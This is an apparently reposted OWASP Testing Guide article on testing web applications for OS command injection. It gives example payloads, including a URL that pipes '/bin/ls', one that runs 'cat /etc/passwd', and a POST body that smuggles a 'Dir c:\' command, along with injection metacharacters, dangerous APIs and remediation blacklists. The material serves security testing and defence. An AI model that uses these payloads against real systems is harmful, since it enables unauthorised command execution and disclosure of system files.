#rce #hacking #injection 
source: https://wiki.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)
# Testing for Command Injection (OTG-INPVAL-013)

**This article is part of the new OWASP Testing Guide v4.**  
Back to the OWASP Testing Guide v4 ToC:
   [https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents](https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents)
Back to the OWASP Testing Guide Project:
   [https://www.owasp.org/index.php/OWASP_Testing_Project](https://www.owasp.org/index.php/OWASP_Testing_Project)

- [1Summary](https://wiki.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)#Summary)
- [2How to Test](https://wiki.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)#How_to_Test)
- [3Special Characters for Comand Injection](https://wiki.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)#Special_Characters_for_Comand_Injection)
- [4Code Review Dangerous API](https://wiki.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)#Code_Review_Dangerous_API)
- [5Remediation](https://wiki.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)#Remediation)
    - [5.1Sanitization](https://wiki.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)#Sanitization)
    - [5.2Permissions](https://wiki.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)#Permissions)
- [6Tools](https://wiki.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)#Tools)
- [7References](https://wiki.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)#References)

## Summary

This article describes how to test an application for OS command injection. The tester will try to inject an OS command through an HTTP request to the application.

  
OS command injection is a technique used via a web interface in order to execute OS commands on a web server. The user supplies operating system commands through a web interface in order to execute OS commands. Any web interface that is not properly sanitized is subject to this exploit. With the ability to execute OS commands, the user can upload malicious programs or even obtain passwords. OS command injection is preventable when security is emphasized during the design and development of applications.

  

## How to Test

When viewing a file in a web application, the file name is often shown in the URL. Perl allows piping data from a process into an open statement. The user can simply append the Pipe symbol “|” onto the end of the file name.

  
Example URL before alteration:  

http://sensitive/cgi-bin/userData.pl?doc=user1.txt  

  
Example URL modified:  

http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|  

  
This will execute the command “/bin/ls”.  

  
Appending a semicolon to the end of a URL for a .PHP page followed by an operating system command, will execute the command. %3B is url encoded and decodes to semicolon  

Example:  

http://sensitive/something.php?dir=%3Bcat%20/etc/passwd  

  
**Example**  
Consider the case of an application that contains a set of documents that you can browse from the Internet. If you fire up WebScarab, you can obtain a POST HTTP like the following:

…POST http://www.example.com/public/doc HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1) Gecko/20061010 FireFox/2.0
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 300
Proxy-Connection: keep-alive
Referer: http://127.0.0.1/WebGoat/attack?Screen=20
Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
Content-Type: application/x-www-form-urlencoded
Content-length: 33

Doc=Doc1.pdf

  
In this post request, we notice how the application retrieves the public documentation. Now we can test if it is possible to add an operating system command to inject in the POST HTTP. Try the following:

POST http://www.example.com/public/doc HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1) Gecko/20061010 FireFox/2.0
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 300
Proxy-Connection: keep-alive
Referer: http://127.0.0.1/WebGoat/attack?Screen=20
Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
Content-Type: application/x-www-form-urlencoded
Content-length: 33

Doc=Doc1.pdf+|+Dir c:\

  
If the application doesn't validate the request, we can obtain the following result:

Exec Results for 'cmd.exe /c type "C:\httpd\public\doc\"Doc=Doc1.pdf+|+Dir c:\'
Output...
Il volume nell'unità C non ha etichetta.
Numero di serie Del volume: 8E3F-4B61
Directory of c:\
 18/10/2006 00:27 2,675 Dir_Prog.txt
 18/10/2006 00:28 3,887 Dir_ProgFile.txt
 16/11/2006 10:43
    Doc
    11/11/2006 17:25
       Documents and Settings
       25/10/2006 03:11
          I386
          14/11/2006 18:51
	     h4ck3r
	     30/09/2005 21:40 25,934 
		OWASP1.JPG
		03/11/2006 18:29
			Prog
			18/11/2006 11:20
				Program Files
				16/11/2006 21:12
					Software
					24/10/2006 18:25
						Setup
						24/10/2006 23:37
							Technologies
							18/11/2006 11:14	
							3 File 32,496 byte
							13 Directory 6,921,269,248 byte disponibili
							Return code: 0

  
In this case, we have successfully performed an OS injection attack.

## Special Characters for Comand Injection

The following special character can be used for command injection such as |  ; & $ > < ` \ !

- cmd1|cmd2  : Uses of | will make command 2 to be executed weather command 1 execution is successful or not.

- cmd1;cmd2  : Uses of ; will make command 2 to be executed weather command 1 execution is successful or not.
- cmd1||cmd2  : Command 2 will only be executed if command 1 execution fails.
- cmd1&&cmd2 : Command 2 will only be executed if command 1 execution succeeds.
- $(cmd) : For example, echo $(whoami) or $(touch test.sh; echo 'ls' > test.sh)
- 'cmd' : It's used to execute specific command. For example, 'whoami'
- >(cmd): <(ls)
- <(cmd): >(ls)

## Code Review Dangerous API

Be aware of the uses of the following API as it may introduce the command injection risks.

Java

- Runtime.exec()
- getParameter
- getRuntime.exec()
- ProcessBuilder.start()
- setAttribute putValue getValue 
- java.net.Socket java.io.fileInputStream java.io.FileReader

C/C++

- system
- exec
- ShellExecute
- execlp

Python

- exec

- eval

- os.system
- os.popen
- subprocess.popen
- subprocess.call

PHP

- system
- shell_exec
- exec
- proc_open
- eval  
    
- passthru
- proc_open
- expect_open
- ssh2_exec
- popen

Perl

- CGI.pm
- referer
- cookie
- ReadParse

ASP.NET

- HttpRequest.Params
- HttpRequest.Url
- HttpRequest.Item

## Remediation

### Sanitization

The URL and form data needs to be sanitized for invalid characters. A “blacklist” of characters is an option but it may be difficult to think of all of the characters to validate against. Also there may be some that were not discovered as of yet. A “white list” containing only allowable characters or command list should be created to validate the user input. Characters that were missed, as well as undiscovered threats, should be eliminated by this list.

Genereal blacklist to be included for commannd injection can be |  ; & $ > < ' \  ! >> #

Escape or filter special characters for windows,   ( ) < > & * ‘ | = ? ; [ ] ^ ~ ! . ” % @ / \ : + , `   
Escape or filter special characters for Linux, { }  ( ) < > & * ‘ | = ? ; [ ]  $ – # ~ ! . ” %  / \ : + , `

### Permissions

The web application and its components should be running under strict permissions that do not allow operating system command execution. Try to verify all these informations to test from a Gray Box point of view

## Tools

- OWASP [WebScarab](https://wiki.owasp.org/index.php/OWASP_WebScarab_Project "OWASP WebScarab Project")
- OWASP [WebGoat](https://wiki.owasp.org/index.php/OWASP_WebGoat_Project "OWASP WebGoat Project")
- [Commix](https://github.com/commixproject/commix)

## References

- [http://www.securityfocus.com/infocus/1709](http://www.securityfocus.com/infocus/1709)
- [http://projects.webappsec.org/w/page/13246950/OS%20Commanding](http://projects.webappsec.org/w/page/13246950/OS%20Commanding)
- [https://cwe.mitre.org/data/definitions/78.html](https://cwe.mitre.org/data/definitions/78.html)
- [https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=2130132](https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=2130132)